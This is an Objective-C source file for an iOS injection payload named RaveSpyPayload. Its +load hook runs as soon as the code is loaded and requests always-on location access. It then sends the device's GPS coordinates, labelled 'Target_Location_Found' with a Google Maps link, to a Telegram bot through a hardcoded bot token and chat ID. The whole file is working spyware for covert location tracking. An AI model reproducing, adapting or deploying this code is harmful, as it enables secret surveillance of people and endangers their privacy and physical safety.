#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>

// Bot details from Nabard
static NSString *const kBotToken = @"8676310726:AAGIvvuZyJ5mVnNtUnVyLQJ7mpR0xOc5W8E";
static NSString *const kChatID = @"8422095778";

@interface RaveSpyPayload : NSObject <CLLocationManagerDelegate>
@property (nonatomic, strong) CLLocationManager *locationManager;
@end

@implementation RaveSpyPayload

+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        [[RaveSpyPayload alloc] init];
    });
}

- (instancetype)init {
    self = [super init];
    if (self) {
        self.locationManager = [[CLLocationManager alloc] init];
        self.locationManager.delegate = self;
        
        if ([self.locationManager respondsToSelector:@selector(requestAlwaysAuthorization)]) {
            [self.locationManager requestAlwaysAuthorization];
        }
        [self.locationManager startUpdatingLocation];
        
        [self transmitData:@"[System] Hook Initialized"];
    }
    return self;
}

- (void)transmitData:(NSString *)payload {
    NSString *encodedStr = [payload stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
    NSString *urlStr = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@&parse_mode=Markdown", kBotToken, kChatID, encodedStr];
    
    NSURL *url = [NSURL URLWithString:urlStr];
    [[[NSURLSession sharedSession] dataTaskWithURL:url] resume];
}

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    CLLocation *location = [locations lastObject];
    if (location) {
        double lat = location.coordinate.latitude;
        double lon = location.coordinate.longitude;
        double acc = location.horizontalAccuracy;
        
        NSString *log = [NSString stringWithFormat:@"Target_Location_Found\nCoordinates: %f, %f\nAccuracy: %.2fm\nMap: https://www.google.com/maps?q=%f,%f", lat, lon, acc, lat, lon];
        
        [self transmitData:log];
        [self.locationManager stopUpdatingLocation];
    }
}

@end